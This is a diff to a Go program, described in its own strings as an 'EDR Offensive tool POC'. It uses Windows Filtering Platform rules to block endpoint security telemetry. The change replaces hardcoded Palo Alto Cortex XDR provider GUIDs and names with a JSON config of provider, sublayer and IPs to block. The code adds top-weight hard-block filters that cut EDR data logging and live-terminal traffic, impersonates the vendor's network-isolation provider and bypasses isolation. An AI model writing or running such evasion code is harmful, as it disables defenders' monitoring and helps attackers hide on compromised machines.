@@ -2,7 +2,9 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net/netip"
 	"os"
@@ -11,49 +13,94 @@ import (
 	"inet.af/wf"
 )
 
+type Config struct {
+	Provider struct {
+		Provider_name string `json:"provider_name"`
+		Provider_ID   string `json:"provider_ID"`
+	} `json:"provider"`
+	Sublayer struct {
+		Sublayer_name string `json:"sublayer_name"`
+		Sublayer_ID   string `json:"sublayer_ID"`
+	} `json:"sublayer"`
+	Block []map[string]string `json:"Block"`
+}
+type BlockIP struct {
+	Entry netip.Addr
+}
+
 func main() {
-	// Create a new firewall rule
-	fmt.Printf("[+] Starting Anti cortex XDR WFP\n")
-	session, err := wf.New(&wf.Options{
-		Name:    "XDR Offensive tool POC",
-		Dynamic: true,
-	})
+	// Check if the config file path is provided as an argument
+	if len(os.Args) < 2 {
+		fmt.Println("Usage: wfp.exe <config_file.json>")
+		os.Exit(1)
+	}
+	// Get the config file path from command-line arguments
+	configFile := os.Args[1]
+	// Read the JSON file
+	data, err := ioutil.ReadFile(configFile)
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println("[+] Created new Session name = XDR Offensive tool POC")
+	fmt.Printf("[+] Starting Anti EDR with WFP filters\n")
+
+	// Unmarshal the JSON data into a Config struct
+	var config Config
+	err = json.Unmarshal(data, &config)
+	if err != nil {
+		log.Fatal("[!] Error processing your config file\n", err)
+	} else {
+		fmt.Printf("[+] Config file parsed\n")
+	}
+	//fmt.Println("provider_name = ", config.Provider.Provider_name)
+	//fmt.Println("provider_ID = ", config.Provider.Provider_ID)
+	//fmt.Println("sublayer_name = ", config.Sublayer.Sublayer_name)
+	//fmt.Println("sublayer_ID = ", config.Sublayer.Sublayer_ID)
+	//os.Exit(0)
+
+	session, err := wf.New(&wf.Options{
+		Name:    "EDR Offensive tool POC with WFP",
+		Dynamic: true,
+	})
+	if err != nil {
+		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
+		log.Fatal(err)
+	}
+
+	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'")
 
 	//guidprovider, _ := windows.GenerateGUID()
-	guidprovider, _ := windows.GUIDFromString("{4544A023-2767-411C-86E4-3EA52A4AA172}")
+	guidprovider, _ := windows.GUIDFromString(config.Provider.Provider_ID)
 	providerID := wf.ProviderID(guidprovider)
 	err = session.AddProvider(&wf.Provider{
 		ID:         providerID,
-		Name:       "Palo Alto Networks Corporation - Cortex XDR Network Isolation",
+		Name:       config.Provider.Provider_name,
 		Persistent: false,
 	})
 	if err != nil {
 		fmt.Println(err)
-		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of Provider ! Continuing still ...\n")
+		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of Provider ! Continuing still ...")
+		fmt.Println("")
 	} else {
-		fmt.Println("[+] Adding Provider name = 'Palo Alto Networks Corporation - Cortex XDR Network Isolation' providerID = ", guidprovider, " Persistent = false")
+		fmt.Println("[+] Adding Provider name = '", config.Provider.Provider_name, "' providerID = ", guidprovider, " Persistent = false")
 	}
-	guid, _ := windows.GUIDFromString("{849BDEF4-C2D5-4464-96E8-3CBE11841AD6}")
+	guid, _ := windows.GUIDFromString(config.Sublayer.Sublayer_ID)
 
 	//guid, _ := windows.GenerateGUID()
 	sublayerID := wf.SublayerID(guid)
 
 	err = session.AddSublayer(&wf.Sublayer{
 		ID:       sublayerID,
-		Name:     "Palo Alto Networks Corporation - Cortex XDR Network Isolation",
+		Name:     config.Sublayer.Sublayer_name,
 		Provider: providerID,
 		Weight:   0xffff, // the highest possible weight
 
 	})
 	if err != nil {
 		fmt.Println(err)
-		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of sublayer ! Continuing still ...\n")
+		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of sublayer ! Continuing still ...")
+		fmt.Println("")
 	} else {
-		fmt.Println("[+] Adding sublayer guid = ", guid, " name = Palo Alto Networks Corporation - Cortex XDR Network Isolation weight 0xffff")
+		fmt.Println("[+] Adding sublayer guid = ", guid, " name = ", config.Sublayer.Sublayer_name, " Isolation weight 0xffff")
 	}
 	layers := []wf.LayerID{
 		//wf.LayerALEAuthRecvAcceptV4,
@@ -62,6 +109,21 @@ func main() {
 		//wf.LayerOutboundTransportV4,
 
 	}
+	var TableBlockIP []BlockIP
+
+	for _, entry := range config.Block {
+		for region, ip := range entry {
+			fmt.Printf("  [+] Name: %s, IP: %s\n", region, ip)
+			MyIP, err := netip.ParseAddr(ip)
+			if err != nil {
+				fmt.Println("[!] Error converting to an IP addresse : ", ip)
+				panic(err)
+			}
+			NewEntry := BlockIP{MyIP}
+			TableBlockIP = append(TableBlockIP, NewEntry)
+		}
+	}
+
 	EDR_EU, err := netip.ParseAddr("34.102.140.103")
 	if err != nil {
 		panic(err)
@@ -89,14 +151,14 @@ func main() {
 
 	for _, layer := range layers {
 		guid, _ := windows.GenerateGUID()
-		fmt.Println("[+] Adding WFP rule to block XDR EDR data logging and live terminal for EU,DE & CH guid = ", guid, " name = XDR_BLOCKING_RULE for layer = ", layer)
+		fmt.Println("[+] Adding WFP rule to block EDR flow guid = ", guid, " name = 'EDR_BLOCKING_RULE' for layer = ", layer)
 		err = session.AddRule(&wf.Rule{
 			ID:         wf.RuleID(guid),
-			Name:       "XDR_BLOCKING_RULE",
+			Name:       "EDR_BLOCKING_RULE",
 			Layer:      layer,
 			Sublayer:   sublayerID,
 			Provider:   providerID,
-			Persistent: false, // no need to keep rule for next reboot
+			Persistent: false, // no need to keep rule if process exits.
 			HardAction: true,  //rule cannot be overriden except by a Veto
 			Action:     wf.ActionBlock,
 			Weight:     1000,
@@ -142,11 +204,6 @@ func main() {
 					Value: wf.IPProtoTCP,
 				},
 			},
-			/*Dst: &wf.NetInfo{
-				IP:   net.ParseIP("1.2.3.4"),
-				Port: 443,
-			},
-			Protocol: wf.TCP,*/
 		})
 		if err != nil {
 			log.Print("ERROR: ", err)
@@ -156,7 +213,6 @@ func main() {
 	// bypassing the Isolation in case of
 	isolationlayers := []wf.LayerID{
 		wf.LayerALEAuthRecvAcceptV4,
-		wf.LayerALEAuthConnectV4,
 		wf.LayerALEAuthConnectV4,
 		wf.LayerOutboundTransportV4,
 	}
